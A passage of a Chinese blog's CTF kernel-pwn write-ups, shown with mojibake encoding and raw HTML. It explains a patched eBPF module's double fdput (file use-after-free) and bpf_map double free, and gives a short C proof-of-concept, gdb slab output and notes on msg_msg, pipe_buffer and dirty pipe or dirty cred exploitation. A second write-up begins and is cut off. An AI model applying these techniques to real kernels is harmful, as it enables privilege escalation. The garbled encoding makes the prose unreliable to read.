è·å–å½“å‰è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼Œå¦‚æœå½“å‰è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦è¡¨å¼•ç”¨è®¡æ•°ä¸º 1 (atomic_read_acquire(&amp;files-&gt;count) &#x3D;&#x3D; 1)ï¼Œè¯´æ˜æ²¡æœ‰å…¶ä»–çº¿ç¨‹æ­£åœ¨æ“ä½œè¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦è¡¨ï¼Œå¯ä»¥æ‰§è¡Œè½»é‡çº§çš„æŸ¥æ‰¾ï¼Œç›´æ¥è°ƒç”¨ files_lookup_fd_raw åœ¨æ–‡ä»¶æè¿°ç¬¦è¡¨ä¸­æŸ¥æ‰¾å¯¹åº”çš„æ–‡ä»¶ç»“æ„ä½“ struct fileã€‚  </p><p>å¦‚æœæ–‡ä»¶æè¿°ç¬¦è¡¨çš„å¼•ç”¨è®¡æ•°ä¸ä¸º 1 (atomic_read_acquire(&amp;files-&gt;count) !&#x3D; 1)ï¼Œè¯´æ˜å¯èƒ½æœ‰çº¿ç¨‹æ­£åœ¨æ“ä½œè¿™ä¸ªè¡¨ï¼Œæ­¤æ—¶éœ€è¦æ‰§è¡Œæ›´é‡é‡çº§çš„æŸ¥æ‰¾ï¼Œå³è°ƒç”¨ __fget_files_rcu å‡½æ•°ï¼Œå¦‚æœè¯»è€…è¿™ä¸ªå‡½æ•°çš„å…·ä½“åŠŸèƒ½æ„Ÿå…´è¶£çš„è¯å¯ä»¥è‡ªè¡Œå»çœ‹<a href="https://elixir.bootlin.com/linux/v6.11.2/source/fs/file.c#L1026">æºç </a>ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä»–ä¼šè¿”å›å½“å‰ fd æ‰€æŒ‡å‘çš„ file ç»“æ„ä½“å¹¶å°†å…¶ f_count åŠ ä¸€ã€‚åœ¨è°ƒç”¨å®Œ __fget_files å‡½æ•°åä¼šç»™ fd ç»“æ„ä½“çš„ flags æ ‡å¿—ä½åŠ ä¸Šä¸€ä¸ª FDPUT_FPUTã€‚  </p><p>æ¥ä¸‹æ¥æ˜¯ fdput å‡½æ•°ï¼Œçœ‹è¿™ä¸ªå‡½æ•°åå°±æ„Ÿè§‰å’Œ fput åŠŸèƒ½å¾ˆç›¸è¯†ï¼Œå…¶æºç å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">fdput</span><span class="params">(<span class="keyword">struct</span> fd fd)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fd.flags &amp; FDPUT_FPUT)</span><br><span class="line">fput(fd.file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä½œç”¨å°±æ˜¯åˆ¤æ–­ fd ç»“æ„ä½“çš„æ ‡å¿—ä½æ˜¯å¦å­˜åœ¨ FDPUT_FPUTï¼Œå¦‚æœå­˜åœ¨åˆ™é€šè¿‡è°ƒç”¨ fput æ¥ä»¤ file ç»“æ„ä½“çš„ f_count å‡ä¸€ï¼Œè€Œ FDPUT_FPUT æˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„åˆ†æå¯çŸ¥éœ€è¦åˆ©ç”¨å¤šçº¿ç¨‹è°ƒç”¨ __fget_light æ‰ä¼šç»™åŠ ä¸Šã€‚  </p><p>__bpf_map_get å‡½æ•°æ¯”è¾ƒé‡è¦ï¼Œå…¶æºç å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* if error is returned, fd is released.</span></span><br><span class="line"><span class="comment"> * On success caller should complete fd access with matching fdput()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *__<span class="title">bpf_map_get</span>(<span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EBADF);</span><br><span class="line"><span class="keyword">if</span> (f.file-&gt;f_op != &amp;bpf_map_fops) &#123;</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> f.file-&gt;private_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__bpf_map_get å‡½æ•°æ˜¯ç”¨äºè·å– eBPF æ˜ å°„çš„å¼•ç”¨ï¼Œè¯¥å‡½æ•°æ¥æ”¶ä¸€ä¸ªæ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆeBPF æ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰ä½œä¸ºå‚æ•°ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸ªæ™®é€šçš„æ–‡ä»¶è€Œä¸æ˜¯ eBPF çš„æ˜ å°„ï¼Œé‚£ä¹ˆ __bpf_map_get å°±ä¼šè°ƒç”¨ fdput å¤„ç†è¯¥ fd ç»“æ„ä½“ç„¶åè¿”å›é”™è¯¯ -EINVALã€‚é—®é¢˜å°±å‡ºç°åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬å†ä»”ç»†çœ‹çœ‹è¿™æ®µ patch çš„ä»£ç ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>)) &#123;</span><br><span class="line">        fdput(f);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ __bpf_map_get è¿”å›é”™è¯¯çš„æ—¶å€™è¿˜ä¼šå†æ¬¡è°ƒç”¨ fdput å†å¤„ç†ä¸€æ¬¡ f å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ˜¯æ™®é€šæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦è€Œä¸æ˜¯ eBPF æ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™æ®µæ–°å¢çš„ bpf åŠŸèƒ½å°†ä¼šå¯¹è¿™ä¸ª fd ç»“æ„ä½“å¯¹è±¡æ‰§è¡Œä¸¤æ¬¡ fdputï¼Œè€Œé€šè¿‡æˆ‘ä»¬ä¸Šé¢çš„åˆ†æï¼Œå¦‚æœ fd ç»“æ„ä½“çš„æ ‡å¿—ä½æœ‰ FDPUT_FPUT çš„è¯ä¼šæ‰§è¡Œ fputï¼Œè¿™æ ·å°±ä¼šé€ æˆ file uafã€‚<br>æ‰€ä»¥åœ¨è¿™é“é¢˜ç›®ä¸­æˆ‘ä»¬åªéœ€è¦å†åˆ›å»ºä¸€ä¸ªçº¿ç¨‹åœ¨è¿™ä¸ªæ–°å¢çš„ bpf æ¨¡å—ä¸­ä¼ å…¥ä¸€ä¸ªæ™®é€šæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦å³å¯æ„é€ å‡º file uafï¼Œæœ‰äº† file uaf ä¹‹åæ‰“æ³•å°±å¤šæ ·åŒ–äº†ï¼Œå½“æ—¶æˆ‘ä»¬çš„åšæ³•æ˜¯ç”¨ dirty cred æ„é€ æ–‡ä»¶è¶Šæƒå†™ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°ã€‚  </p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ linux kernel 6.12+ ä¹‹åè¿™éƒ¨åˆ†çš„ä»£ç å‘ç”Ÿäº†å¾ˆå¤§çš„æ”¹å˜ï¼Œæ¯”å¦‚ __bpf_map_get å‡½æ•°ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *__<span class="title">bpf_map_get</span>(<span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">if</span> (fd_empty(f))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EBADF);</span><br><span class="line"><span class="keyword">if</span> (unlikely(fd_file(f)-&gt;f_op != &amp;bpf_map_fops))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"><span class="keyword">return</span> fd_file(f)-&gt;private_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ä¼ å…¥çš„æ–‡ä»¶æè¿°ç¬¦ä¸æ˜¯ eBPF æ˜ å°„çš„æ–‡ä»¶æè¿°æ—¶ä¸ä¼šå†è°ƒç”¨ fdputã€‚  </p><p>è¿™é“é¢˜ç›®çš„é¢„æœŸæ¼æ´åº”è¯¥å°±æ˜¯åœ¨ patch æ–‡ä»¶æœ€ä¸‹é¢çš„è¿™ä¸ªåœ°æ–¹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">atomic64_set(&amp;<span class="built_in">map</span>-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">atomic64_set(&amp;<span class="built_in">map</span>-&gt;sleepable_refcnt, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰‹åŠ¨çš„å°† bpf_map ç»“æ„ä½“ä¸­çš„ refcnt å¯¹è±¡è®¾ç½®ä¸º 0ã€‚å½“æˆ‘ä»¬ä½¿ç”¨ close å‡½æ•°å…³é—­ eBPF æ–‡ä»¶çš„æ˜ å°„çš„æ—¶å€™å†…æ ¸ä¼šå°†è¯¥æ–‡ä»¶å¯¹åº”çš„ bpf_map ç»“æ„ä½“çš„ refcont å¯¹è±¡å‡ä¸€å¹¶åˆ¤æ–­ refcnt çš„å€¼æ˜¯å¦ä¸º 0ï¼Œå¦‚æœä¸º 0ï¼Œåˆ™é‡Šæ”¾è¯¥ bpf_map ç»“æ„ä½“ã€‚è‹¥æˆ‘ä»¬èƒ½å¤Ÿä»¤ refcnt çš„å€¼å¤§äºä¸€ç„¶åè°ƒç”¨è¿™ä¸ªæ–°å¢çš„ bpf æ¨¡å—ï¼Œå°±èƒ½å¤Ÿæ„é€ å‡ºå¯¹åŒä¸€ä¸ª bpf_map ç»“æ„ä½“çš„å¤šæ¬¡é‡Šæ”¾ã€‚ä¸€ä¸ª double free çš„ poc å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line"><span class="type">int</span> inner_map = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="number">4</span>, <span class="number">4</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> (inner_map &lt; <span class="number">0</span>) err_exit(<span class="string">&quot;Failed to bpf_map_create for inner_map&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] inner_map: %d\n&quot;</span>, inner_map);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> outer_map = create_bpf_array_of_map(inner_map, <span class="number">4</span>, <span class="number">4</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> (outer_map &lt; <span class="number">0</span>) err_exit(<span class="string">&quot;Failed to bpf_map_create for outer_map&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] outer_map: %d\n&quot;</span>, outer_map);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] set inner_map.ref = 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (bpf_map_update_elem(outer_map, &amp;key, &amp;inner_map, BPF_ANY) &lt; <span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;Failed to bpf_map_update_elem&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] BUG set inner_map.ref = 1&quot;</span>);</span><br><span class="line">trigger(inner_map);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] close outer_map to free inner_mmap&#x27;s bpf_map object&quot;</span>);</span><br><span class="line"><span class="comment">// frist free bpf_map</span></span><br><span class="line">close(outer_map);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] try to close inner_map&quot;</span>);</span><br><span class="line"><span class="comment">// second free bpf_map</span></span><br><span class="line">trigger(inner_map);</span><br><span class="line">close(inner_map);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨ gdb ä¸­å³å¯çœ‹åˆ°éå¸¸æ˜æ˜¾çš„ double freeï¼Œè¿™é‡Œä½¿ç”¨äº† <a href="https://github.com/bata24/gef">bata24&#x2F;gef</a> è¿™ä¸ªæ’ä»¶ï¼Œé‡Œé¢æ”¯æŒè®¸å¤šç”¨äºè°ƒè¯•å†…æ ¸ã€å„ç§ç±»å‹çš„ heap ç­‰æŒ‡ä»¤ï¼Œä¸è¿‡æˆ‘ä¸æ˜¯å¾ˆå–œæ¬¢ä»–çš„æŒ‡ä»¤æ ¼å¼å’Œ UI ç•Œé¢ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; slub-dump kmalloc<span class="number">-512</span> -n -q</span><br><span class="line">slab_caches @ <span class="number">0xffffffffa9562c80</span></span><br><span class="line"></span><br><span class="line">  kmem_cache: <span class="number">0xffff987801042a00</span></span><br><span class="line">    name: kmalloc<span class="number">-512</span></span><br><span class="line">    flags: <span class="number">0x10008</span> (SLAB_STORE_USER)</span><br><span class="line">    object size: <span class="number">0x200</span> (chunk size: <span class="number">0x200</span>)</span><br><span class="line">    offset (next pointer in chunk): <span class="number">0x100</span></span><br><span class="line">    red_left_pad: <span class="number">0x0</span></span><br><span class="line">    kmem_cache_cpu (cpu0): <span class="number">0xffff98780f632c20</span></span><br><span class="line">      active page: <span class="number">0xffffec9640078640</span></span><br><span class="line">        virtual address: <span class="number">0xffff987801e19000</span></span><br><span class="line">        num pages: <span class="number">1</span></span><br><span class="line">        in-use: <span class="number">6</span>/<span class="number">8</span></span><br><span class="line">        frozen: <span class="number">1</span></span><br><span class="line">        layout:   <span class="number">0x000</span> <span class="number">0xffff987801e19000</span> (next: <span class="number">0xffff987801e19000</span>: Corrupted (Loop detected))</span><br><span class="line">                  <span class="number">0x001</span> <span class="number">0xffff987801e19200</span> (in-use)</span><br><span class="line">                  <span class="number">0x002</span> <span class="number">0xffff987801e19400</span> (in-use)</span><br><span class="line">                  <span class="number">0x003</span> <span class="number">0xffff987801e19600</span> (in-use)</span><br><span class="line">                  <span class="number">0x004</span> <span class="number">0xffff987801e19800</span> (in-use)</span><br><span class="line">                  <span class="number">0x005</span> <span class="number">0xffff987801e19a00</span> (in-use)</span><br><span class="line">                  <span class="number">0x006</span> <span class="number">0xffff987801e19c00</span> (in-use)</span><br><span class="line">                  <span class="number">0x007</span> <span class="number">0xffff987801e19e00</span> (in-use)</span><br><span class="line">        freelist (fast path):</span><br><span class="line">                  <span class="number">0x000</span> <span class="number">0xffff987801e19000</span></span><br><span class="line">                        <span class="number">0xffff987801e19000</span>: Corrupted (Loop detected)</span><br><span class="line">        freelist (slow path): (none)</span><br><span class="line">    next: <span class="number">0xffff987801042900</span></span><br><span class="line">gef&gt;</span><br></pre></td></tr></table></figure><p>ç”±äºè¿™ä¸ªå†…æ ¸ç¼–è¯‘æ—¶æ²¡æœ‰å¼€å¯ CONFIG_SLAB_FREELIST_HARDENED é€‰é¡¹æ‰€ä»¥å¯ä»¥ç›´æ¥è¿ç»­é‡Šæ”¾åŒä¸€ä¸ª object ä¸¤æ¬¡ï¼Œå¦‚æœå¼€å¯åå¯ä»¥æå‰ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º 0x200 çš„ pipe_buffer æ•°ç»„ï¼Œåœ¨ç¬¬ä¸€æ¬¡é‡Šæ”¾ bpf_map åé‡Šæ”¾è¯¥æ•°ç»„ç„¶åå†æ¬¡é‡Šæ”¾ bpf_map å³å¯ã€‚  </p><p>åœ¨è¿™ä¸ªç¯å¢ƒä¸­ kmalloc-512 free_list çš„ next æŒ‡é’ˆåœ¨åç§»ä¸º 0x100 çš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨ msg æ¥å ä½è¯¥ double free çš„å †å—ï¼ˆåé¢ç§°ä¸º victim objï¼‰å¹¶ä¿®æ”¹ next æŒ‡é’ˆçš„ä½ä½æŒ‡å‘ victim obj + 0x30 çš„ä½ç½®ï¼ˆé˜²æ­¢ä¿®æ”¹ msg å¤´ï¼‰ã€‚ç„¶åå†ç”³è¯· pipe_buffer æ¥å†æ¬¡å ä½ victim objï¼ˆè¯¥ pipe_buffer çš„èµ·å§‹ä½ç½®ä½äº victim obj + 0x30ï¼‰ï¼Œæ­¤æ—¶å³å¯é€šè¿‡è¯¥ msg æ¥ä¿®æ”¹ pipe_bufferã€‚æ¥ä¸‹æ¥çš„æ”»å‡»æ‰‹æ®µä¹Ÿæœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚ä¿®æ”¹ pipe_buffer çš„ flags æ¥æ‰“ dirty pipeã€ä¿®æ”¹ pipe_buffer çš„ page æŒ‡é’ˆæ¥æ„é€  page uaf ç­‰ï¼Œè¿™é‡Œä¹Ÿä¸å†åšèµ˜è¿°ã€‚  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Securinets CTF Final 2024: Safe Compressor</title>
      <link href="/2025/01/09/Compressor/"/>
      <url>/2025/01/09/Compressor/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨æœ€å‰é¢"><a href="#å†™åœ¨æœ€å‰é¢" class="headerlink" title="å†™åœ¨æœ€å‰é¢"></a>å†™åœ¨æœ€å‰é¢</h2><p>å¤ä¹ äº†ä¸€å¤©é«˜æ•°ï¼Œæ™šä¸Šå¤´æ˜æ¬²è£‚ï¼Œå¤§è„‘é…¸çš„ä¸€æ‰¹ğŸ¤¡ğŸ¤¡ğŸ¤¡ï¼Œç„¶åæƒ³æ‰¾é“ CTF é¢˜ç›®æ”¾æ¾ä¸€ä¸‹ã€‚ç„¶åæƒ³åˆ°å»å¹´ 11 æœˆçš„æ—¶å€™ç©ºç™½ç»™æˆ‘å‘äº†ä¸€é“é¢˜ç›®å«æˆ‘çœ‹çœ‹ï¼Œå¯ä»¥å½“æ—¶å’ŒåŒå­¦åœ¨å¤–é¢çœ‹ã€Šæ¯’æ¶²ï¼šlast danceã€‹ï¼Œæ‰€ä»¥å°±æ²¡æœ‰å»åšè¿™é“é¢˜ç›®ã€‚äºæ˜¯æˆ‘æ‰¾ç©ºç™½é—®äº†ä¸€ä¸‹ï¼Œäº†è§£åˆ°è¿™é“é¢˜ç›®å½“æ—¶ 0 è§£ï¼Œæ¥åŠ²äº†ï¼ï¼ï¼ä¸è¿‡è™½ç„¶è¯´æ˜¯ 0 è§£é¢˜ï¼Œæˆ‘æ˜¯è§‰å¾—æŒºç®€å•çš„ï¼Œä¸¤ä¸ªå°æ—¶å°±åšå‡ºæ¥äº†ğŸ¤”ï¼Œæ„Ÿè§‰æ˜¯å› ä¸º final é€‰æ‰‹ä»¬æ¯”è¾ƒç´§å¼ å°±ç›´æ¥æŠŠå†…æ ¸é¢˜ç»™è·³è¿‡äº†ğŸ¤”    </p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>è¿™æ˜¯ä¸€é“ linux kernel pwnï¼Œå¥½åƒä¹Ÿæ²¡ä»€ä¹ˆè¦æ³¨æ„çš„ï¼Œå°±æ˜¯ç‰ˆæœ¬ç‰¹åˆ«çš„é«˜ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@slub-vm:/home/user$ <span class="built_in">uname</span> -r</span><br><span class="line">6.12.0-rc7+</span><br></pre></td></tr></table></figure><p>å‡ºé¢˜äººä¹Ÿç‰¹åˆ«çš„å‹å¥½ï¼Œç›´æ¥ç»™å‡ºäº†å†…æ ¸é©±åŠ¨çš„æºç ï¼Œçœå»äº†æˆ‘ä»¬è®¸å¤šé€†å‘çš„éº»çƒ¦ :)  </p><h2 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span 